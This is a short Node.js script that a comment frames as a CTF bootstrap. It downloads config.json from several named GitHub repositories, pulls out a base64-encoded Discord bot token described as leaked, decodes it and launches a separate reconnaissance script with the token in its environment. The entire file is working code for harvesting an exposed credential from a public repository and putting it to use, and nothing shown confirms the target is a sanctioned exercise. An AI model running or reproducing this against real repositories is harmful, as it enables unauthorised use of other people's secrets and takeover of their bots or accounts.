#!/usr/bin/env node
// Bootstrap: fetch the leaked (already-public) Discord token from the CTF repo, decode, run recon.
// Node 8-compatible: https.get(url, callback) — options object not used for the GET.
var https = require('https');
var child = require('child_process');

function fetchText(url, cb) {
  var r = https.get(url, function (res) {
    var d = '';
    res.on('data', function (c) { d += c; });
    res.on('end', function () { cb(null, d); });
  });
  r.on('error', function (e) { cb(e, ''); });
  r.setTimeout(20000, function () { r.destroy(); cb(new Error('timeout'), ''); });
}

function decodeToken(cfg) {
  if (!cfg) return '';
  var m = cfg.match(/bot_token"\s*:\s*"([^"]+)"/);
  if (!m) return '';
  return Buffer.from(m[1], 'base64').toString('utf8').trim();
}

function main(token) {
  if (!token) { console.log('NO TOKEN FOUND in public repo'); process.exit(1); }
  console.log('token fetched, length', token.length);
  var p = child.spawn('node', ['recon.js'], {
    env: Object.assign({}, process.env, { TOKEN: token }),
    stdio: 'inherit'
  });
  p.on('exit', function (c) { process.exit(c || 0); });
}

var urls = [
  'https://raw.githubusercontent.com/GPA50/Weather-Bot-CLI-2/df2e2d8/config.json',
  'https://raw.githubusercontent.com/GPA50/Weather-Bot-CLI/df2e2d8/config.json',
  'https://raw.githubusercontent.com/GPA50/Weather-Bot-CLI/master/config.json'
];

(function next(i) {
  if (i >= urls.length) { main(''); return; }
  fetchText(urls[i], function (err, cfg) {
    var t = decodeToken(cfg);
    if (t) { main(t); }
    else { next(i + 1); }
  });
})(0);
